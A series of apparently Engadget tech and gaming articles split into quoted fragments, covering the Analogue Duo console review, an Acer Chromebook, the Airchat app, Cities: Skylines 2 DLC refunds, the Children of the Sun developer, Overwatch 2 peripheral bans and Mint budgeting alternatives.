"It started with the CMVS, an obsessive (and expensive) wood-grained reboot of the iconic Neo Geo.",
" Then came the Analogue Nt in 2014, which brought easy, high-def NES gaming to our homes .",
" In 2017, the Super Nt did the same for SNES gaming, then the Mega Sg for the Sega Genesis and, most recently, the Analogue Pocket, which supports everything from the Game Boy to the Neo Geo Pocket thanks to a series of adapters.",
"Analogue&#39;s latest is something different.",
" While all those before have lived and died by their cartridge ports, the new Analogue Duo takes us to the next generation of gaming: optical.",
" That&#39;s right, Analogue has entered the multimedia era with this love letter to one of Japan&#39;s most beloved consoles, a machine that barely made a dent elsewhere in the world.",
"That system is the TurboGrafx-16, known as the PC Engine in its home market of Japan.",
" It launched there in 1987, beating the Sega Genesis to market by two years and the SNES by three.",
" It rocketed to huge popularity, ultimately outselling Sega and keeping pace with Nintendo for much of its life.",
" By the end of its run, its library offered nearly 700 games.",
"It didn&#39;t fare so well in the US.",
" The TurboGrafx-16 didn&#39;t come here until 1989, arriving after the Genesis brought blast processing to the masses.",
" Nintendo and Sega soon engaged in a marketing war of epic proportions.",
" NEC&#39;s humble TurboGrafx-16 didn&#39;t stand a chance.",
"It didn&#39;t help that it wasn&#39;t really a 16-bit console.",
" Though it offered support for 16-bit graphics, it only had an 8-bit internal processor, so it couldn&#39;t match the power of the competition.",
" The add-on CD-ROM didn&#39;t help.",
" Despite hitting the market years before the Sega CD, the Genesis add-on included an additional processor to deliver an early taste of 3D processing.",
" The TurboGrafx drive was just that: an optical drive.",
"The system struggled in the US for a few more years before NEC pulled the plug in 1994.",
" In Japan, new games hit the system all the way through 1999, meaning that even the most hardcore enthusiasts in the US missed out on the bulk of the PC Engine&#39;s best titles.",
"And, since the Analogue Duo can play imported games just as readily as local ones, it&#39;s a great excuse to dig deeper into that library.",
"Out of the box",
"Tim Stevens for Engadget",
"The Analogue Duo is a slender console that shares an aesthetic similar to the PC Engine Duo, which was released in the US as the TurboDuo.",
" NEC&#39;s Duo integrated the CD-ROM peripheral into a single, sleek, unified device.",
" But, the Analogue unit feels far nicer.",
" Its plastic body  feels sturdier than the brittle stuff used on consoles back in the &#39;90s, and the bottom is even rubberized.",
" In fact, the Duo feels more like a high-end piece of home theater equipment, whereas the TurboGrafx-16 feels like a 30-year-old toy.",
"Up front are two slots.",
" On the left is where cartridge-based games go, either on HuCard or TurboChip, the two media formats NEC used over the years.",
" On the right is the CD-ROM slot.",
"Output to your display is via the HDMI port on the back, but there&#39;s also a 3.",
"5mm headphone jack with its own volume knob if you want some private listening.",
" You&#39;ll also find a port on the side for wired controllers, but since this uses the smaller Japanese connector, not the larger American one, you&#39;ll need an adapter to use TurboGrafx-16 controllers.",
"Around the back is an SD card reader for firmware updates or the like, plus a USB-C port through which the system gets its power.",
"At the heart of the system is an Altera Cyclone V processor, a dual-core Arm Cortex field-programmable gate array (FPGA) chip that can be effectively coded to act like any other processor.",
" It&#39;s that core which enables the Duo to emulate the PC Engine and all its derivatives over the years.",
"There&#39;s none of the lag and glitchy performance that you&#39;ll get when running ROMs through an emulator.",
" This is as close as you&#39;re going to get to a modern reboot of the PC Engine, but with much cleaner output.",
"Output",
"Analogue",
"Whether you&#39;re playing domestic or imported games, everything will look stellar.",
" As with previous Analogue releases, the Duo outputs a 1080p signal over HDMI, resulting in the absolute cleanest way to play your games on a modern digital display.",
"While there are ways to get an HDMI signal out of a TurboGrafx-16, ranging from RGB adapters that clip on the back to outputs soldered onto the system itself, even running through something like a scanline converter you&#39;re unlikely to ever get a signal this crisp and clean.",
"But for those who like to preserve a taste of the old school, Analogue includes a few different gameplay modes to deliver a CRT-like look and feel.",
"To be fair, even the greatest of games for this system don&#39;t offer much in terms of high-fidelity graphics compared to modern titles.",
" But there are plenty well worth your time.",
" Gate of Thunder is one of them, and it’s among the best side-view shooters, or shmups, ever to hit a console.",
" The quality of games like this helped establish the PC Engine&#39;s success in Japan.",
"Castlevania: Rondo of Blood, though, is generally believed to be the single greatest title for the system.",
" Released on CD-ROM in 1993, exclusively in the Japanese market, this is still ranked among the top Castlevania titles of them all.",
"It&#39;s damned good, and plays excellently on the Analogue Duo.",
" Load times for this game and others are quite fast, and the drive isn&#39;t as noisy as many console CD-ROM add-ons were back in the day.",
"Gaming on the Analogue Duo",
"The Analogue Duo delivered flawless compatibility and playback for virtually every game I threw at it, with only one falling short: SCI: Special Criminal Investigation — which, thank goodness, has nothing to do with the CSI television series.",
" SCI is the sequel to Chase H.",
"Q.",
", which was big in American arcades.",
" Its unique mix of driving and shooting, as well as the inclusion of amazing period cars like the Nissan 300ZX Turbo made it a real favorite of mine.",
" In fact, this was the first game I tried to play on the Duo.",
"So, imagine my horror when the Analogue system wouldn&#39;t play it or even recognize it.",
" It just displayed a blank screen, much like what happens on a region-locked US TurboGrafx-16 console when trying to play a Japanese game.",
" So, I went into the Duo&#39;s settings, explicitly changed the region to Japan, and the game played without issue.",
"This is the only game that the Duo failed to appropriately identify the region of, which is a minor annoyance at best that I&#39;m sure will be fixed soon in one of Analogue&#39;s frequent updates.",
"Firmware updates are easily applied via the integrated SD-card reader, which is also where your save games for CD-based titles are stored.",
" This makes them easy to back up or even edit.",
" With the appropriate USB adapter, it&#39;s also possible to import your old save games.",
"Controllers",
"Tim Stevens for Engadget",
"If there&#39;s one fly in this ointment, it&#39;s the controllers.",
" As usual, Analogue partnered with 8BitDo to provide peripherals for the Duo.",
" The $24.",
"99 gamepad is the standard offering, and while it looks good in photos, in the hand it&#39;s somewhat underwhelming.",
"For one thing, it feels just as light and flimsy as 8BitDo&#39;s other products, with buttons that rattle when you shake the thing.",
" The controller doesn&#39;t even offer the same weight and solidity as the original TurboGrafx-16 controllers, which certainly aren&#39;t standouts themselves.",
"But the 8BitDo controllers have a major advantage: they&#39;re wireless.",
" They pair quickly and easily with the Duo and work without lag.",
" They also feature a dedicated home button to bring up the Analogue menu.",
"There is, though, one final kicker with the controllers: they charge over micro-USB.",
" It&#39;s 2024, 8BitDo.",
" Even Apple has moved to USB-C.",
"Wrap-up",
"I really enjoyed testing the Analogue Duo.",
" It was an opportunity to play releases I hadn&#39;t dug out in years, and also to experience some games I hadn&#39;t yet tried, all rendered in immaculate detail.",
"That said, it&#39;s easy to see this as a very niche release for Analogue, a company whose obsessive fans are already far from mainstream.",
" Software emulation is infinitely cheaper and still delivers great results, but those of us who love classic console gaming know that there&#39;s just something different about running it from the original media.",
"Whether that extra something is worth the extra cost is between you and your accountant.",
" Despite being Analogue&#39;s most expensive release in years, and despite supporting a decidedly underappreciated console, the Analogue Duo is yet another excellent quality of life improvement for retro gamers and collectors.",
" I can&#39;t imagine playing my HuCards any other way.",

"Acers new $399 Chromebook Plus 514 hits the mark for a solid budget laptopThere are a frankly ridiculous number of Chromebooks on sale to choose from, but Googles Chromebook Plus initiative that launched last fall has gone a long way towards standardizing some key specs for ChromeOS devices.",
" That in turn has made it a little easier to pick ones thatll provide a consistent quality experience without breaking the bank.",
" Acers latest Chromebook Plus 514, which the company just announced today, is a good example — at first glance, it looks like it checks most of the boxes Im looking for when recommending a basic Chromebook thatll work for most people.",
"&nbsp;",
"To make things confusing, Acer already sells a few Chromebook Plus 514 models; this one is the CB514-4HT and is priced at $399.",
" Look for that SKU if you want to make sure youre getting the latest one.",
" This laptop is powered by Intels 13th-gen Core i3-N305 processor and pairs that with 8GB of RAM and 512GB of storage — that latter spec is a bit of surprise and is a lot more storage than Id expect to see on a $400 Chromebook.",
" To meet the required Chromebook Plus specs, this laptop includes a 1080p webcam with a privacy shutter.",
" While the resolution is pretty solid, not all webcams are equal so well have to see how this one performs in real life.",
"Acer",
"The display is a 14-inch, 1080p touchscreen, so its not quite as tall as the 1,920 x 1,200 screens that Ive seen on a number of other Chromebook Plus laptops.",
" But again, at the price Im not going to complain too much.",
" It has a decent selection of ports, too: two USB-C and USB-A slots along with a microSD card reader.",
" I wouldnt have minded seeing HDMI here, as the USB-C ports could quickly be taken up by power and a monitor, but I just keep reminding myself this computer is only 400 bucks.",
"&nbsp;",
"Acer says that this laptop will hit stores in early May, though the specific SKU were talking about here should also be at Costco as early as next week.",
" The company also says itll have some other configurations available in the near future, though they didnt say whatll change.",
" I wouldnt be surprised to see a model with less storage or perhaps no touchscreen, which could drive the price down even more.",

"Airchat is the latest app trying to make social audio cool againThere’s a new invite-only app going semi-viral among VCs, tech execs and other Silicon Valley personalities.",
" It’s called Airchat and it’s trying to revive the concept of an audio-first social media app.",
"The premise is similar to Clubhouse, the audio app that had a viral moment at the height of the pandemic in 2021 and inspired copycat features in Facebook, Twitter, LinkedIn and Reddit before gradually fading into obscurity.",
" But unlike the original version of Clubhouse, Airchat isn’t built around live audio streams that require users to all tune it at once.",
" It’s more like Twitter or Threads, except posts can only be shared as voice notes.",
"The app uses a timeline format, and automatically plays audio clips as you scroll your feed.",
" You do have the ability to pause the playback and read text instead — each post is accompanied by an AI-generated transcript — but posts and replies can only be shared by recording an audio clip.",
" There don’t seem to be any time constraints on how long individual clips can be, I found at least one post where a user spoke for a full hour just to see if it would work (it did).",
"It sounds a bit gimmicky (because it is), but the app has all the hallmarks of the kind of social apps that briefly go viral among a certain segment of extremely-online Silicon Valley nerds.",
" It’s led by a pair of well-connected tech founders: AngelList co-founder Naval Ravikant and former Tinder exec Brian Norgard.",
" It’s invitation-only and has drawn a number of well-known tech personalities among its early users: Y Combinator CEO and San Francisco political provocateur Gary Tan, Spotify CEO Daniel Ek, OpenAI founder Sam Altman, VC and Elon Musk confidant Jason Calacanis.",
"Over on X, Airchat’s high-profile user base is building hype and creating FOMO for those who haven’t been able to score an invite.",
" (The app had to briefly shut off invites over the weekend due to “an influx of new users,” according to Ravikant, Airchat’s CEO.",
")",
"It’s not clear exactly how many users Airchat has just yet, but it seems to be in the low tens of thousands.",
" The app has been downloaded close to 50,000 times, research firm Appfigures told Engadget, but it’s likely some of those downloads have come from people who don’t yet have an invite.",
" Ravikant, who seems to be one of the most-followed users, currently has just over 11,000 followers in the app.",
"Using Airchat is, well, noisy and a bit confusing.",
" Upon joining, the app asks to tap your contacts list to find friends who are already on the app, but finding people to follow beyond that can be challenging.",
" The app doesn’t have the equivalent of a “for you” feed with recommended content so your only options are to manually search for users or lurk in conversations that do appear in your feed and check out other users’ posts and follows.",
"When I signed up, there were four people from my contacts in the app, only two of whom are actual friends.",
" I followed them and the app’s founders and a couple other familiar names.",
" I then began randomly following other users as conversations began to appear in my feed.",
" This was a terrible strategy as my feed was quickly dominated by the voices of a few especially active (but not terribly interesting) posters.",
" With so many new users all joining at the same time, at one point my feed was just a bunch of people talking about Airchat.",
"It’s also somewhat jarring to actually hear the voices of people you’ve followed on social media for ages but haven’t interacted with IRL.",
" The app defaults to playing back audio at 2x speed, which tends to make people’s speaking voices sound a bit unnatural, but is also kind of necessary for long-winded posts.",
"The bigger issue, though, is that it’s not entirely clear what Airchat is for.",
" There are a handful of “channels,” smaller groups dedicated to chatting about specific topics like coffee or astrology or AI or war, but conversations are disjointed and hard to follow.",
" There seem to be some corners with spirited discussion.",
" The “coffee” channel has 755 members and has lots of earnest discussion of pour-over techniques and photos of latte art.",
" The channel is also “moderated heavily,” according to Ravikant (Airchat’s moderation policy is “self moderation,” which means they expect you to make good use of blocking and muting features, though an FAQ states they will remove users for “harassment, impersonation, foul behavior, and illegal content.",
")",
"More creative users are also finding ways to play with the audio-centric format.",
" I found an ASMR group that consisted mainly of people speaking in breathy whispers that kind of gave me the ick (one person did post a nice clip of their cat purring).",
" I listened to a few poetry readings in the “poetry” channel, but didn’t have the patience, even at 2x speed.",
" There’s also a lot of talk of in-app karaoke, though I have yet to see it actually happen.",
"Some might see these kinds of gimmicks as the start of some new paradigm, where people use their voices to unlock new ways of interacting.",
" But all I can think about is how Clubhouse, at its peak, had similar gimmicks: in-app game shows, open mic nights and (very NSFW) “moan rooms.",
"” It was new and interesting at a time when most people were stuck at home with nothing to do, but the novelty wore off quickly.",
"While Clubhouse’s initial success sparked copycat features from almost every other major social media company, many of those have since shut down due to lack of interest.",
" Even Clubhouse itself is a shell of what it once was.",
" While the app still exists, it’s an entirely different service than the one that briefly captured the attention of bored tech workers.",
" The company laid off half its staff in 2023 and has since pivoted to audio-centric group chats.",

" It’s also significantly delaying the game&#39;s future DLC and console port.",
"Beach Properties was the first paid DLC for Cities: Skylines 2, and has an “Overwhelmingly Negative” rating on Steam, with just 4 percent of user reviews marked as positive.",
" In a note announcing the reverse of course, Colossal Order CEO Mariina Hallikainen said the company had let its community down.",
"&nbsp;",
"“We thought we could make up for the shortcomings of the game in a timeframe that was unrealistic, and rushed out a DLC that should not have been published in its current form,&quot; Hallikainen said.",
" &quot;For all this, we are truly sorry.",

"The asset pack itself worked as advertised, adding a number of zoneable waterfront-style properties to the game, but it was definitely thin for the $9.",
"99 asking price.",
" Most will admit, though, that the content itself wasn’t the problem: The DLC was largely derided because it was released at a time when players were waiting on patches for the base game.",
" Cities: Skylines 2 was released in a poorly optimized state in October 2023, and although it’s in better shape now, many in the community feel there are fundamental issues with the simulation, and there is still work to be done to make the game run better.",
" Mod support — perhaps the reason that the original Cities: Skylines had such a long lifespan — was also slow to arrive, and is still only in beta, with no support for custom assets.",

" Essentially, if you bought the DLC separately, you should be able to get a refund.",

"&quot; The beachfront properties will be added to the base game, free of charge, for all players.",
"To call Cities: Skylines 2’s launch messy would be kind.",
" Since the game’s release on PC last October, developer Colossal Order has burned through the goodwill it built up over a near-decade of the original game’s lifespan.",

"Another casualty of today&#39;s announcement is the game&#39;s console release.",
" Cities: Skylines 2 was supposed to launch simultaneously on PC and console, but the PS5 and Xbox versions were pushed back to spring 2024 weeks before release.",
" It has been clear for some time that revised date was not going to happen, and Colossal Order confirmed it&#39;s now hoping to have the console ports ready for October.",

"It took 20 years for Children of the Sun to become an overnight successChildren of the Sun burst onto the indie scene like a muzzle flash on a dark night.",
" Publisher Devolver Digital dropped the game’s first trailer on February 1, showcasing frenzied sniper shots and a radioactive art style.",
" A Steam demo highlighting its initial seven stages went live that same day and became a breakout hit during February’s Steam Next Fest.",
" Two months later it landed in full and to broad acclaim.",
" This explosive reveal and rapid release timeline mirrors the game itself — chaotic but contained, swift and direct, sharp and bright.",
"Though it feels like Children of the Sun popped into existence over the span of two months, it took solo developer René Rother more than 20 years to get here.",
"René Rother",
"As a kid in Berlin in the early 2000s, Rother was fascinated by the booming mod community.",
" He spent his time messing around with free Counter-Strike mapping tools and Quake III mods from the demo discs tucked into his PC magazines.",
" Rother daydreamed about having a job in game development, but it never felt like an attainable goal.",
"“It just didn&#39;t seem possible to make games,” he told Engadget.",
" “It&#39;s like it was this huge black box.",
"”",
"Rother couldn’t see an easy entry point until the 2010s, when mesh libraries and tools like GameMaker and Unity became more accessible.",
" He discovered a fondness for creating 3D interactive art.",
" But aside from some free online Javascript courses, he didn’t know how to program anything, so his output was limited.",
"“I dabbled into it a little bit, but then got kicked out.",
" Again,” Rother said.",
" “It was just like the whole entrance barrier was so big.",
"”",
"René Rother",
"Rother pursued graphic design at university and he found the first two years fulfilling, with a focus on classical art training.",
" By the end of his schooling, though, the lessons covered practical applications like working with clients, and Rother’s vision of a graphic design career smashed into reality.",
"“There was an eye-opening moment where I felt like, this is not for me,” Rother said.",
"In between classes, Rother was still making games for himself and for jams like Ludum Dare, steadily building up his skillset and cementing his reputation in these spaces as a master of mood.",
"“Atmospheric kind of pieces, walking simulators,” Rother said, recalling his early projects.",
" “Atmosphere was very interesting to me to explore.",
" But I never thought that it was actually something that could turn into a game.",
" I never thought that it would become something that can be sold in a way that it&#39;s actually a product.",
"”",
"René Rother",
"By the late 2010s Rother decided he was officially over graphic design and ready to try a job in game development.",
" He applied to a bunch of studios and, in the meantime, picked up odd jobs at a supermarket and as a stagehand, setting up electronics.",
" He eventually secured a gig as a 3D artist at a small studio in Berlin.",
" Meanwhile, his pile of game jam projects and unfinished prototypes continued to grow.",
"“In that timeframe, Children of the Sun happened,” Rother said.",
"In Children of the Sun, players are The Girl, a woman who escaped the cult that raised her and is now enacting sniper-based revenge on all of its cells, one bullet at a time.",
" In each round, players line up their shot and then control a single bullet as it ricochets through individual cult members.",
" The challenge lies in finding the most speedy, efficient and stylish path of death, earning a spot at the top of the leaderboards.",
"“It was just a random prototype I started working on,” Rother said.",
" “And one Saturday morning I was thinking, ‘I don&#39;t know what I&#39;m doing with my life.",
"&#39;” With an atmospheric prototype and a head full of ennui, Rother emailed Devolver Digital that same day about potentially publishing Children of the Sun.",
"“The response was basically, ‘The pitch was shit but the game looks cool,’” Rother said.",
" “And then it became a thing.",
"”",
"René Rother",
"Visually, Children of the Sun is dazzling.",
" It has a sketchy 3D art style that’s covered in bruise tones, with dark treelines, glowing yellow enemies and layers of texture.",
" Every scene looks like The Girl just took a hit of adrenaline and her senses are on high alert, lending a hectic sense of hyper-vigilance to the entire experience.",
" It’s a game built on instinct.",
"“I didn&#39;t make any mood boards,” Rother said.",
" “I didn&#39;t prepare [for] it.",
" It was just like, oh, let&#39;s make it this color.",
" Ah, let&#39;s make it this color….",
" This is something to very easily get lost in.",
" I spent a lot of time just adjusting the color of grass so it works well with the otherwise purplish tones and these kinds of things.",
" I spent way too much time on the colors.",
"”",
"Children of the Sun went through multiple visual iterations where Rother played with contrast, depth, fog density and traditional FPS color palettes, before landing on the game’s dreamlike and neon-drenched final form.",
" The residue of this trial and error is still visible beneath Children of the Sun’s frames, and that’s exactly how Rother likes it.",
"“I see it as a big compliment, actually,” he said.",
" “In paintings, when we talk about visual art, I really like when you can see the brushstrokes.",
" I like when you can still see the lines of the pencil before the painting got made.",
" I like the roughness.",
" I wanted everything to be rough.",
" I didn&#39;t want it to be polished.",
"”",
"Rother picked up the game’s soundtrack collaborator, experimental ambient composer Aidan Baker, the same way he hooked up with Devolver.",
" Rother was a fan of Baker and his band Nadja, and he wanted a similar droning, slowcore vibe as a backdrop for Children of the Sun.",
" On a whim, Rother sent Baker a casual message asking if he’d like to make music for a video game.",
"“He was like, ‘Well I&#39;ve never done it, so I don&#39;t know,’” Rother remembered.",
" “So we met one evening and then afterwards he was like, ‘Yeah, let&#39;s just do it.",
"’ Instead of just emulating something that I like in the game, I somehow managed to get straight to the source of it.",
" And that was a really nice experience.",
"”",
"For Rother, Children of the Sun has been a lesson in trusting his gut.",
" He hasn’t found the proper word in English or German to describe the atmosphere he created in the game, but it’s something close to melancholy, spiked with an intense coiled energy and bright, psychedelic clarity.",
" He just knows that it feels right — visuals, music, mechanics and all.",
"“That&#39;s kind of how I live my life,” Rother said.",
" “Not that I&#39;m, like, super spontaneous or just flip-flopping around with opinions or these kinds of things.",
" It&#39;s more about doing things that feel right to me without necessarily knowing why.",
"”",
"When he booted up that Quake III demo disc and started making 3D vignettes for game jams, Rother didn’t realize he was building the path that would eventually lead him to a major publishing deal, a collaboration with a musician he admires, a big Steam release and a game about cult sniping called Children of the Sun.",
" When Rother takes a moment to survey his current lot in life, he feels lucky, he said.",
"René Rother",
"“I feel like in the last three years, somehow, lots of things fell into my lap,” Rother said.",
" “Although I still had to do something for it.",
" I needed to be prepared for this moment, that required work.",
"… But in the time where I prepared myself, I was not aware that I was preparing myself.",
" So that&#39;s how the feeling of luck gets amplified a bit more.",
"”",
"“Luck” is one way to describe it, but “artistic instinct” might be just as fitting.",
" Children of the Sun is available now on Steam for $15.",

"Blizzard takes aim at Overwatch 2 console cheatersLike many other multiplayer games, Overwatch 2&nbsp;isn&#39;t immune from cheaters.",
" And it&#39;s not only an issue on PC, where cheaters use tools like aimbots.",
" Some folks use XIM devices so they can play with a keyboard and mouse (KBM) on consoles.",
" This is against Blizzard&#39;s rules, as KBM players typically have an aim advantage over those who use a controller, even though the console versions of the game have features like aim assist.",
" While it&#39;s taken some time to get the ball rolling, the developer is finally doing something about the XIM problem.",
"XIM devices trick consoles into believing that KBM users are playing with a controller.",
" However, in a blog post, Blizzard says it has been able to detect KBM players on consoles over the last few Overwatch 2 seasons.",
" It has found that the cheating problem is more prevalent among higher ranked players.",
" The developers say that use of so-called unapproved peripherals is &quot;very rare&quot; in lower ranks.",
"During the current season (which started this week), Blizzard will dish out permanent bans to the most extreme users of unapproved peripherals.",
" It will rely on reports from other players and its own data to pinpoint those who are breaking the rules.",
"Starting in Season 11, which should get underway in June, the developers will tackle the issue at a broader level.",
" The first time a console player is detected using an unapproved device on consoles, they&#39;ll be banned from Competitive modes for a week.",
" If they keep using KBM or other unapproved peripherals in casual modes, they&#39;ll get a season-long Competitive suspension, only have the option of playing with other KBM users in Quick Play and lose access to aim assist features.",
" It&#39;s all in the name of fairness.",
"There are accessibility concerns here, though, as some folks simply can&#39;t play games with a standard controller.",
" Blizzard says that it has done its &quot;utmost to ensure that players with accessibility needs will be less likely to trigger our detection.",
"&quot; The developers say they will tailor their enforcement actions so that folks with accessibility needs can still land a sick Earthshatter or keep healing their teammates.",
"With all that said, Blizzard is looking into adding official KBM support on consoles so folks can play the game that way without negatively impacting controller players.",
" As things stand, console and PC players are separated into separate pools for Competitive play.",
" So to make things fair, Blizzard would need to shuffle console players who want to use a keyboard and mouse into games with other KBM players and no aim assist.",
"The XIM problem isn&#39;t exactly new.",
" The Overwatch 2 developers&#39; colleagues at Activision last year started banning Call of Duty players who spoof input devices (or just messing with them, as usual).",
" Ubisoft and Epic have also targeted XIM users in Rainbow Six: Siege and Fortnite, respectively.",
"Blizzard is doing more on other fronts to try to keep Overwatch 2 fair and more enjoyable for the majority of players.",
" It&#39;s punishing those who leave in the middle of matches more severely and taking a stronger stance on toxicity in voice and text chat.",
"Meanwhile, there&#39;s been a kerfuffle this week related to Overwatch 2 players being banned for using profanity.",
" Those who use slurs or threaten others should obviously face appropriate consequences, but apparently booting out players from a game that has profanity filters for some slightly spicy trash talk is some kind of BS.",

"The 6 best Mint alternatives to replace the budgeting app that shut downWere now living in a post-Mint world.",
" Intuit shuttered the popular budgeting app on March 24, 2024, and suggested its millions of users switch to its other finance app, Credit Karma.",
" I, along with 3.",
"6 million others (as of 2021, according to Bloomberg), had been Mint users for a long time.",
" Many of us liked the Mint app for how it easily allowed us to track all accounts in one place and monitor credit scores.",
" It was also a great tool for sticking to a monthly spending plan and setting goals like building a rainy-day fund or paying down my mortgage faster.",
"I gave Credit Karma a shot in the months leading up to Mint shutting down.",
" I was left unimpressed; it’s not a true Mint alternative, so I set out to find an app that could be.",
" The following guide lays out my experience testing some of the most popular Mint replacement apps available today.",
" If you’re also on the hunt for a budgeting app to replace Mint, we hope these details can help you decide which of the best budgeting apps out there could meet your needs in this post-Mint world.",
"How to import your financial data from Mint ",
"Mint users should consider getting their data ready to migrate to their new budgeting app of choice soon.",
" Unfortunately, importing data from Mint is not as easy as entering your credentials from inside your new app and hitting “import.",
"” In fact, any app that advertises the ability to port over your stats from Mint is just going to have you upload a CSV file of transactions and other data.",
"To download a CSV file from Mint, do the following: ",
" Sign into Mint.",
"com and hit Transactions in the menu on the left side of the screen.",
" Select an account, or all accounts.",
" Scroll down and look for “export [number] transactions” in smaller print.",
" Your CSV file should begin downloading.",
"Note: Downloading on a per-account basis might seem more annoying, but could help you get set up on the other side, if the app you’re using has you importing transactions one-for-one into their corresponding accounts.",
"How we tested ",
"Before I dove into the world of budgeting apps, I had to do some research.",
" To find a list of apps to test, I consulted trusty ol’ Google (and even trustier Reddit); read reviews of popular apps on the App Store; and also asked friends and colleagues what budget tracking apps they might be using.",
" Some of the apps I found were free, just like Mint.",
" These, of course, show loads of ads (excuse me, “offers”) to stay in business.",
" But most of the available apps require paid subscriptions, with prices typically topping out around $100 a year, or $15 a month.",
" (Spoiler: My top pick is cheaper than that.",
") ",
"Since this guide is meant to help Mint users find a permanent replacement, any services I chose to test needed to do several things: import all of your account data into one place; offer budgeting tools; and track your spending, net worth and credit score.",
" Except where noted, all of these apps are available for iOS, Android and on the web.",
"Once I had my shortlist of six apps, I got to work setting them up.",
" For the sake of thoroughly testing these apps (and remember, I really was looking for a Mint alternative myself), I made a point of adding every account to every budgeting app, no matter how small or immaterial the balance.",
" What ensued was a veritable Groundhog Day of two-factor authentication.",
" Just hours of entering passwords and one-time passcodes, for the same banks half a dozen times over.",
" Hopefully, you only have to do this once.",
"The best Mint alternative: Quicken Simplifi ",
"  ",
"No pun intended, but what I like about Quicken Simplifi is its simplicity.",
" Whereas other budgeting apps try to distinguish themselves with dark themes and customizable emoji, Simplifi has a clean user interface, with a landing page that you just keep scrolling through to get a detailed overview of all your stats.",
" These include your top-line balances; net worth; recent spending; upcoming recurring payments; a snapshot of your spending plan; top spending categories; achievements; and any watchlists you’ve set up.",
" You can also set up savings goals elsewhere in the app.",
" I also appreciate how it offers neat, almost playful visualizations without ever looking cluttered.",
" I felt at home in the mobile and web dashboards after a day or so, which is faster than I adapted to some competing services (I’m looking at you, YNAB and Monarch).",
"Getting set up with Simplifi was mostly painless.",
" I was particularly impressed at how easily it connected to Fidelity; not all budget trackers do, for whatever reason.",
" This is also one of the only services I tested that gives you the option of inviting a spouse or financial advisor to co-manage your account.",
" One thing I would add to my initial assessment of the app, having used it for a few months now: I wish Simplifi offered Zillow integration for easily tracking your home value (or at least a rough estimate of it).",
" Various competitors including Monarch Money and Copilot Money work with Zillow, so clearly theres a Zillow API available for use.",
" As it stands, Simplifi users must add real estate manually like any other asset.",
"  Dana Wollman / Engadget",
"In practice, Simplifi miscategorized some of my expenses, but nothing out of the ordinary compared to any of these budget trackers.",
" As you’re reviewing transactions, you can also mark if you’re expecting a refund, which is a unique feature among the services I tested.",
" Simplifi also estimated my regular income better than some other apps I tested.",
" Most of all, I appreciated the option of being able to categorize some, but not all, purchases from a merchant as recurring.",
" For instance, I can add my two Amazon subscribe-and-saves as recurring payments, without having to create a broad-strokes rule for every Amazon purchase.",
"The budgeting feature is also self-explanatory.",
" Just check that your regular income is accurate and be sure to set up recurring payments, making note of which are bills and which are subscriptions.",
" This is important because Simplifi shows you your total take-home income as well as an “income after bills” figure.",
" That number includes, well, bills but not discretionary subscriptions.",
" From there, you can add spending targets by category in the “planned spending” bucket.",
" Planned spending can also include one-time expenditures, not just monthly budgets.",
" When you create a budget, Simplifi will suggest a number based on a six-month average.",
"Not dealbreakers, but two things to keep in mind as you get started: Simplifi is notable in that you can’t set up an account through Apple or Google.",
" There is also no option for a free trial, though Quicken promises a “30-day money back guarantee.",
"” ",
"The best Mint alternative (runner-up): Monarch Money ",
"  ",
"Monarch Money grew on me.",
" My first impression of the budgeting app, which was founded by a former Mint product manager, was that its more difficult to use than others on this list, including Simplifi, NerdWallet and Copilot.",
" And it is.",
" Editing expense categories, adding recurring transactions and creating rules, for example, is a little more complicated than it needs to be, especially in the mobile app.",
" (My advice: Use the web app for fine-tuning details.",
") Monarch also didn’t get my income right; I had to edit it.",
"Once you’re set up, though, Monarch offers an impressive level of granularity.",
" In the budgets section, you can see a bona fide balance sheet showing budgets and actuals for each category.",
" Youll also find a forecast, for the year or by month.",
" And recurring expenses can be set not just by merchant, but other parameters as well.",
" For instance, while most Amazon purchases might be marked as “shopping,” those for the amounts of $54.",
"18 or $34.",
"18 are definitely baby supplies, and can be automatically marked as such each time, not to mention programmed as recurring payments.",
" Weirdly, though, there’s no way to mark certain recurring payments as bills, specifically.",
"  Dana Wollman / Engadget",
"Not long after I first published this story in December 2023, Monarch introduced a detailed reporting section where you can create on-demand graphs based on things like accounts, categories and tags.",
" That feature is available just on the web version of the app for now.",
" As part of this same update, Monarch added support for an aggregator that makes it possible to automatically update the value of your car.",
" This, combined with the existing Zillow integration for tracking your home value, makes it easy to quickly add a non-liquid asset like a vehicle or real estate, and have it show up in your net worth graph.",
"The mobile app is mostly self-explanatory.",
" The main dashboard shows your net worth; your four most recent transactions; a month-over-month spending comparison; income month-to-date; upcoming bills; an investments snapshot; a list of any goals you’ve set; and, finally, a link to your month-in-review.",
" That month-in-review is more detailed than most, delving into cash flow; top income and expense categories; cash flow trends; changes to your net worth, assets and liabilities; plus asset and liability breakdowns.",
" In February 2024, Monarch expanded on the net worth graph, so that if you click on the Accounts tab you can see how your net worth changed over different periods of time, including one month, three months, six months, a year or all time.",
"On the main screen, you’ll also find tabs for accounts, transactions, cash flow, budget and recurring.",
" Like many of the other apps featured here, Monarch can auto-detect recurring expenses and income, even if it gets the category wrong.",
" (They all do to an extent.",
") Expense categories are marked by emoji, which you can customize if you’re so inclined.",
"Monarch Money uses a combination of networks to connect with banks, including Plaid, MX and Finicity, a competing network owned by Mastercard.",
" (I have a quick explainer on Plaid, the industry standard in this space, toward the end of this guide.",
") As part of an update in late December, Monarch has also made it easier to connect through those other two networks, if for some reason Plaid fails.",
" Similar to NerdWallet, I found myself completing two-factor authentication every time I wanted to get past the Plaid screen to add another account.",
" Notably, Monarch is the only other app I tested that allows you to grant access to someone else in your family — likely a spouse or financial advisor.",
" Monarch also has a Chrome extension for importing from Mint, though really this is just a shortcut for downloading a CSV file, which you’ll have to do regardless of where you choose to take your Mint data.",
"Additionally, Monarch just added the ability to track Apple Card, Apple Cash, and Savings accounts, thanks to new functionality brought with the iOS 17.",
"4 update.",
" Its not the only one either; currently, Copilot and YNAB have also added similar functionality that will be available to anyone with the latest versions of their respective apps on a device running iOS 17.",
"4.",
" Instead of manually uploading statements, the new functionality allows apps like Monarchs to automatically pull in transactions and balance history.",
" That should make it easier to account for spending on Apple cards and accounts throughout the month.",
"Monarch also recently launched investment transactions in beta.",
" It also says bill tracking and an overhauled goals system are coming soon.",
" Monarch hasnt provided a timeline for that last one, except to say that the improved goals feature is coming in early 2024.",
"The best up-and-comer: Copilot Money ",
"  ",
"Copilot Money might be the best-looking budgeting app I tested.",
" It also has the distinction of being exclusive to iOS and Macs — at least for now.",
" Andres Ugarte, the company’s CEO, has publicly promised that Android and web apps are coming in 2024 (more likely the second half of the year, Ugarte tells me).",
